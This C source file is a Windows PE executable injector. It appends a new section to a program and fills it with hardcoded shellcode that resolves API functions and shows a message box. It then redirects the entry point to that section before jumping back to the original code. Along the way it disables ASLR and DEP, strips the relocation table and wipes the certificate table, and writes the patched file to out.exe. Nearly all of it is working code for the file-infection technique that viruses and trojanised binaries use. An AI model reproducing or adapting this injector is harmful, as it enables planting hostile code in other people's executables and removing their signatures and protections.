#include "PE.h"
PE_Info PEfile;
DWORD AddressOfEntryPointOld;

///DWORD align(DWORD size, DWORD align, DWORD addr)
///{
///	if (!(size % align))
///		return addr + size;
///	return addr + (size / align + 1) * align;
///}
#include <stdio.h>

size_t align_up(size_t value, size_t alignment)
{
	return (value + alignment - 1) & ~(alignment - 1);
}

void init(FILE *fileOut, PE_Info *pe)
{
	int i = 0;
	WORD *nmberOfSections = NULL;

	// Get size file
	fseek(fileOut, 0L, SEEK_END);
	pe->dwImageSizeOnDisk = ftell(fileOut);
	fseek(fileOut, 0L, SEEK_SET);

	// Get data file
	char *buffer = (char*)malloc(pe->dwImageSizeOnDisk);
	char *ptr=NULL;
	fread(buffer, pe->dwImageSizeOnDisk, 1, fileOut);
	pe->dwImage = (DWORD)buffer;/////(!)
	///fread((void*)pe->dwImage, pe->dwImageSizeOnDisk, 1, fileOut);???????


	// Put data in IMAGE_DOS_HEADER
	pe->pDosHeader = (PIMAGE_DOS_HEADER)(pe->dwImage);

	// Put data in Dos_Stup
	pe->dwDosStup = (CHAR*)(pe->dwImage + sizeof(IMAGE_DOS_HEADER));
	
	// Put data in IMAGE_NT_HEADERS
	pe->pNtHeaders = (PIMAGE_NT_HEADERS)(((DWORD)pe->dwImage) + pe->pDosHeader->e_lfanew);
	nmberOfSections = &pe->pNtHeaders->FileHeader.NumberOfSections;

	// Put data in IMAGE_SECTION_HEADER
	for (i = 0; i < *nmberOfSections; i++)
	{
		pe->pSectionHeader[i] = (PIMAGE_SECTION_HEADER)(((DWORD)pe->dwImage) + pe->pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER)*i);
	}
}

void addSection(int sizeShellCode, PE_Info PEfile, PE_Info *newPE, IMAGE_SECTION_HEADER *sectionHeader)
{
	int i = 0;

	newPE->pDosHeader = (PIMAGE_DOS_HEADER)PEfile.pDosHeader;
	newPE->dwDosStup = (CHAR*)PEfile.dwDosStup;
	newPE->pNtHeaders = (PIMAGE_NT_HEADERS)PEfile.pNtHeaders;
	newPE->pNtHeaders->FileHeader.NumberOfSections = (WORD)PEfile.pNtHeaders->FileHeader.NumberOfSections + 1;
	newPE->pNtHeaders->OptionalHeader.SizeOfImage = newPE->pNtHeaders->OptionalHeader.SizeOfImage + sizeof(IMAGE_SECTION_HEADER);

	///IMAGE_SECTION_HEADER *sectionHeader=(IMAGE_SECTION_HEADER*)malloc(sizeof(IMAGE_SECTION_HEADER));

	WORD *numberOfSections = &newPE->pNtHeaders->FileHeader.NumberOfSections;
	DWORD *sectionAlignment = &PEfile.pNtHeaders->OptionalHeader.SectionAlignment;
	DWORD *fileAlignment = &newPE->pNtHeaders->OptionalHeader.FileAlignment;

	for (i = 0; i < *numberOfSections; i++)
	{
		newPE->pSectionHeader[i] = PEfile.pSectionHeader[i];
	}


	// Creat new section header
	CopyMemory(sectionHeader->Name, ".AMID", 8);
	///sectionHeader->Misc.VirtualSize = align(sizeShellCode, *sectionAlignment, 0);
	sectionHeader->Misc.VirtualSize = align_up(sizeShellCode, *sectionAlignment);
	///sectionHeader->Misc.VirtualSize = sizeShellCode;
	///sectionHeader->SizeOfRawData = align(sizeShellCode, *fileAlignment, 0);
	sectionHeader->SizeOfRawData = align_up(sizeShellCode, *fileAlignment);
	///sectionHeader->VirtualAddress = align(sectionHeader->Misc.VirtualSize, *sectionAlignment, PEfile.pSectionHeader[*numberOfSections - 2]->VirtualAddress);
	sectionHeader->VirtualAddress = PEfile.pSectionHeader[*numberOfSections - 2]->VirtualAddress + align_up(PEfile.pSectionHeader[*numberOfSections-2]->Misc.VirtualSize
														? PEfile.pSectionHeader[*numberOfSections-2]->Misc.VirtualSize :
														PEfile.pSectionHeader[*numberOfSections - 2]->SizeOfRawData
														, PEfile.pNtHeaders->OptionalHeader.SectionAlignment);
	

	
	sectionHeader->PointerToRawData = newPE->pSectionHeader[*numberOfSections - 2]->SizeOfRawData + PEfile.pSectionHeader[*numberOfSections - 2]->PointerToRawData;
	///sectionHeader->Characteristics  = 0xE00000E0;
	sectionHeader->Characteristics = 0x60000020;
	newPE->pSectionHeader[*numberOfSections - 1] = sectionHeader;
	newPE->dwImage = PEfile.dwImage;
}

void disableASLR(PE_Info *pe)
{
	// disable ASLR
	pe->pNtHeaders->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	//pe->pNtHeaders->OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
	//pe->pNtHeaders->OptionalHeader.DataDirectory[5].Size = { 0 };
	pe->pNtHeaders->OptionalHeader.DataDirectory[5].VirtualAddress = 0;
	pe->pNtHeaders->OptionalHeader.DataDirectory[5].Size = 0;
	pe->pNtHeaders->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
}

void changEntryPoint(PE_Info *pe)
{
	WORD *numberOfSections = &pe->pNtHeaders->FileHeader.NumberOfSections;
	DWORD *entryPoint = &pe->pNtHeaders->OptionalHeader.AddressOfEntryPoint;

	AddressOfEntryPointOld = pe->pNtHeaders->OptionalHeader.AddressOfEntryPoint;
	*entryPoint = (DWORD)pe->pSectionHeader[*numberOfSections-1]->VirtualAddress;
}

void writeToFile(PE_Info arg)
{
	DWORD imageBase = arg.pNtHeaders->OptionalHeader.ImageBase;
	char push[] = "\x68"; // push
	char esp[] = "\xff\x24\x24"; // jmp [esp]
	int i = 0;

	FILE *PEFileF;
	WORD *numberOfSections = &arg.pNtHeaders->FileHeader.NumberOfSections;

	//
	// disable DEP
	arg.pNtHeaders->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

	// zeroize CERTIFICATE table's offset and size
	//arg.pNtHeaders->OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
	//arg.pNtHeaders->OptionalHeader.DataDirectory[4].Size = { 0 };
	arg.pNtHeaders->OptionalHeader.DataDirectory[4].VirtualAddress = 0;
	arg.pNtHeaders->OptionalHeader.DataDirectory[4].Size = 0;

	arg.pSectionHeader[*numberOfSections - 1]->PointerToRelocations = 0;
	arg.pSectionHeader[*numberOfSections - 1]->NumberOfRelocations = 0;
	arg.pSectionHeader[*numberOfSections - 1]->PointerToLinenumbers = 0;
	arg.pSectionHeader[*numberOfSections - 1]->NumberOfLinenumbers = 0;
	//

	PEFileF = fopen("out.exe", "wb");
	fwrite(arg.pDosHeader, sizeof(IMAGE_DOS_HEADER), 1, PEFileF);
	fwrite(arg.dwDosStup, arg.pDosHeader->e_lfanew - sizeof(IMAGE_DOS_HEADER), 1, PEFileF);
	fwrite(arg.pNtHeaders, sizeof(IMAGE_NT_HEADERS), 1, PEFileF);

	for (i = 0; i < *numberOfSections - 1; i++)
	{
		fwrite(arg.pSectionHeader[i], sizeof(IMAGE_SECTION_HEADER), 1, PEFileF);
	}

	fwrite(arg.pSectionHeader[*numberOfSections - 1], sizeof(IMAGE_SECTION_HEADER), 1, PEFileF);

	for (i = 0; i < *numberOfSections - 1; i++)
	{
		fseek(PEFileF, arg.pSectionHeader[i]->PointerToRawData, SEEK_SET);
		fwrite((char *)(arg.dwImage + arg.pSectionHeader[i]->PointerToRawData), arg.pSectionHeader[i]->SizeOfRawData, 1, PEFileF);
	}

	///
	CHAR codeInject[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";
	int sizeCode = sizeof(codeInject);
	///

	char bufInjectSect = 0x00;
	
	fwrite(codeInject, sizeCode - 1, 1, PEFileF);
	
	fwrite(push, 1, 1, PEFileF);
	DWORD oldEntryPoint = imageBase + AddressOfEntryPointOld;
	fwrite(&oldEntryPoint, sizeof(DWORD), 1, PEFileF);
	fwrite(esp, sizeof(esp), 1, PEFileF);
	
	for (i = 0; i < arg.pSectionHeader[*numberOfSections - 1]->SizeOfRawData - sizeCode; i++)
	{
		fwrite(&bufInjectSect, 1, 1, PEFileF);
	}

	fclose(PEFileF);
}